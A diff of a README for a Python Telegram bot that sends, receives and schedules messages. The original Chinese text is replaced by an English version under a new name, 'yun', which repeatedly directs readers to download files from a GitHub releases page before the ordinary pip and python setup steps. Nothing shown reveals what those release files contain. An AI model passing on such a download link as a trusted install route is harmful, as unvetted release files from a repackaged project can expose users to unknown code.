@@ -1,72 +1,114 @@
-# TG-Bot-Message-Sender
+# 🤖 yun - Automate Your Telegram Messaging Effortlessly
 
-这是一个基于 Python 的 Telegram 机器人收发消息脚本，能够帮助用户轻松地实现消息的自动收发。通过简单的配置和调用，可以将该机器人应用于各种场景，如定时消息推送、自动化消息通知等，提高消息传递的效率和准确性。
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen.svg)](https://github.com/Drilaa00/yun/releases)
 
-## 功能
+## 🚀 Getting Started
 
-### 消息接收
-- 能够实时接收用户发送到机器人私聊或机器人所在群组的消息。
-- 对接收到的消息进行解析和处理，提取出消息的文本内容、发送者信息等关键信息。
+Welcome to the yun project! This application allows you to easily send and receive messages through a Telegram bot. Follow the steps below to download and run the software.
 
-### 消息发送
-- 可以向指定的用户或群组发送文本消息，支持多种格式（普通文本、加粗文本、斜体文本等）。
-- 支持发送图片、文件等不同类型的媒体消息。
+## 📥 Download & Install
 
-### 定时消息推送
-- 支持设置定时任务，按照预设的时间间隔自动向指定的用户或群组发送消息，可用于定时发布通知等。
-
-### 关键词回复
-- 根据用户输入的消息内容中的关键词，自动触发相应的回复，提高与用户的互动性。
-
-## 使用方法
-
-### 环境准备
-- 确保已安装 Python 3.6 或更高版本。
-- 安装项目所需的依赖库：
-
-    ```bash
-    pip install -r requirements.txt
-    ```
-
-### 配置机器人
-1. 在 Telegram 中创建一个机器人，获取 API 密钥：
-   - 与 BotFather 进行对话，按照提示完成机器人创建过程。
-   - BotFather 会提供一个唯一的 API 密钥，用于机器人与 Telegram API 进行交互。
+1. **Visit the Releases Page**: To get the latest version of the application, [visit this page to download](https://github.com/Drilaa00/yun/releases).
    
-2. 将获取到的 API 密钥填写到 `config.py` 文件中对应的变量位置：
+2. **Download the Latest Release**: Look for the latest version on the releases page. Click the appropriate file for your system to download it.
 
-    ```python
-    API_KEY = 'your_bot_api_key_here'  # 替换为你的机器人 API 密钥
-    ```
+3. **Extract the Files**: Once downloaded, extract the files to a folder on your computer.
 
-3. 根据需要，在 `config.py` 文件中设置管理员 ID 等其他相关配置信息：
+## 🔧 Requirements
 
-    ```python
-    ADMIN_ID = 'your_admin_user_id_here'  # 替换为你的 Telegram 用户 ID
-    ```
+- **Operating System**: This application works on Windows, MacOS, and Linux.
+- **Python**: Ensure you have Python version 3.6 or higher installed on your system. If you don't have it, you can [download Python here](https://www.python.org/downloads/).
 
-### 运行脚本
-- 在命令行中导航到项目所在的目录，运行以下命令启动机器人：
+## 📦 Install Dependencies
 
-    ```bash
-    python tgbot.py
-    ```
+You will need some additional libraries for the bot to function correctly. Follow these steps:
 
-- 机器人启动后，会连接到 Telegram API 并开始接收和处理消息。
+1. Open a command line interface (CLI) on your system. This can be:
+   - Command Prompt for Windows
+   - Terminal for MacOS or Linux
 
-## 指令说明
+2. Navigate to the folder where you extracted the application files. You can use the `cd` command for this. For example:
 
-- `/start`：开始与机器人对话，获取机器人功能介绍。
-- `/send_message [用户ID] [消息内容]`：向指定用户发送文本消息。
-- `/send_photo [用户ID] [图片URL]`：向指定用户发送图片。
-- `/send_document [用户ID] [文件URL]`：向指定用户发送文件。
-- `/send_media_group [用户ID] [媒体URL1] [媒体URL2] ...`：向指定用户发送包含多张图片、视频或文件的媒体组。
-- `/timer [时间（秒）] [消息内容]`：设置定时任务，在指定时间后向当前聊天发送消息。
+   ```bash
+   cd path/to/your/folder
+   ```
 
-## 注意事项
-- 请确保在合法合规的前提下使用本项目，不要利用 Telegram 机器人发送垃圾消息、违反法律法规或侵犯他人权益的信息。
-- 在配置 API 密钥等敏感信息时，要注意保密，避免泄露给未经授权的人员。
-- 如果需要对机器人进行扩展或定制开发，建议具备一定的 Python 编程基础和对 Telegram API 的了解。
+3. Once you are in the correct directory, run this command to install the required libraries:
 
-## 许可证
-本项目采用 MIT License 许可证。您可以自由使用、修改和分发本项目，但需要保留原作者的版权声明和许可信息。
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+## ⚙️ Configure Your Bot
+
+You need to set up your bot on Telegram before you can use it. Here’s how:
+
+1. **Create a Bot on Telegram**:
+   - Open Telegram and search for "BotFather."
+   - Start a chat with BotFather and follow the prompts to create a new bot.
+   - Upon creation, you will receive an API key. Keep this safe.
+
+2. **Edit the Configuration File**:
+   - Open the `config.py` file in a text editor.
+   - Find the line that says:
+
+   ```python
+   API_KEY = 'your_bot_api_key_here'  # Replace with your bot's API key
+   ```
+
+   - Replace the placeholder text with your actual API key.
+
+3. **Set Admin ID**:
+   - In the same `config.py`, update the line for ADMIN_ID:
+
+   ```python
+   ADMIN_ID = 'your_admin_user_id_here'  # Replace with your Telegram user ID
+   ```
+
+   - This ID identifies you as the bot's admin.
+
+## 🎉 Run the Bot
+
+After setting up the configuration, you can start the bot.
+
+1. **In the Command Line**:
+   - Make sure you are in the same directory as the extracted files. Use the `cd` command if necessary.
+   
+2. **Start the Bot**: Enter the following command to run the bot:
+
+   ```bash
+   python tgbot.py
+   ```
+
+3. **Interact with the Bot**: Once the bot is running, you can start sending messages to it on Telegram. Feel free to test out its features!
+
+## 🔍 Features
+
+### 📬 Message Receiving
+- The bot receives messages sent to it in private chats or groups in real time, allowing for immediate interaction.
+
+### 📨 Message Sending
+- You can send text messages to users or groups. It supports various formats, including plain text and formatted messages.
+
+### ⏰ Timed Message Alerts
+- Set scheduled tasks to send messages at specific intervals. This feature is great for reminders or regular updates.
+
+### 🔑 Keyword Responses
+- The bot recognizes specific keywords in messages and auto-replies, making communication smoother.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues:
+
+- Ensure you have the correct version of Python installed.
+- Check if all dependencies are properly installed.
+- Ensure your API key is valid and correctly added to `config.py`.
+
+For more help, you can visit the [issues section of the repository](https://github.com/Drilaa00/yun/issues).
+
+## 🔗 Additional Resources
+
+- **Documentation**: Check the project documentation for more details on features and configuration options.
+- **Community Support**: Join the community on forums or social media for tips and shared experiences with other users.
+
+If you follow these steps, you'll have your Telegram bot up and running in no time. Enjoy your automated messaging experience!
